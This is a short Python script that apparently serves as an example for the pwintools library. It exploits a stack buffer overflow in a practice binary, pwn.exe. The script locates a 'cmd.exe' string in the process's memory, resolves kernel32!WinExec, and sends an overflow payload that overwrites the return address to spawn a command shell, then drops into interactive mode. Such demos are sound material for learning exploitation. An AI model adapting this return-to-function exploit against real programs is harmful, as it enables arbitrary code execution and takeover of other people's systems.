import sys
import os.path
sys.path.append(os.path.abspath(__file__ + "\..\.."))
from pwintools import *

# Run pwn.exe
proc = Process("pwn.exe")
log.info(proc)

# Search in memory cmd.exe
cmd_exe = proc.search(b"cmd.exe\0")
assert cmd_exe != 0, "Invalid binary cmd.exe not found"

log.info("0x{:x} : {}".format(cmd_exe, proc.leak(cmd_exe, 7)))

# Get WinExec address
WinExec = proc.get_proc_address('kernel32.dll', 'WinExec')   # Faster than proc.symbols['kernel32.dll']['WinExec']

log.info("kernel32!WinExec @ 0x{:x}".format(WinExec))

# Tests
if 0:
    log.log_level = 'debug'
    assert(proc.get_import('kernel32.dll', 'WinExec') == proc.imports['kernel32.dll']['WinExec'].addr)
    assert(proc.symbols['kernel32.dll']['WinExec'] == proc.imports['kernel32.dll']['WinExec'].value)
    assert(proc.symbols['kernel32.dll']['WinExec'] == proc.get_proc_address('kernel32.dll', 'WinExec'))
    assert(proc.symbols['kernel32.dll']['WinExec'] == u32(proc.leak(proc.imports['kernel32.dll']['WinExec'].addr, 4)))
    log.debug(proc.libs)
    log.debug(proc.imports)

log.debug(proc.recvline())
log.debug(proc.recvline())

# You can also Debug it in Python see PythonForWindows documentation
# proc.spawn_debugger(False)
# Dirty crash incoming for pwn.exe :D
proc.send(b'A' * 0x80 + p32(WinExec) + p32(0x42424242) + p32(cmd_exe) + b'A' * 4)
proc.interactive()
proc.close()


# TODO Example with CREATE_SUSPENDED AND proc.threads[0].resume()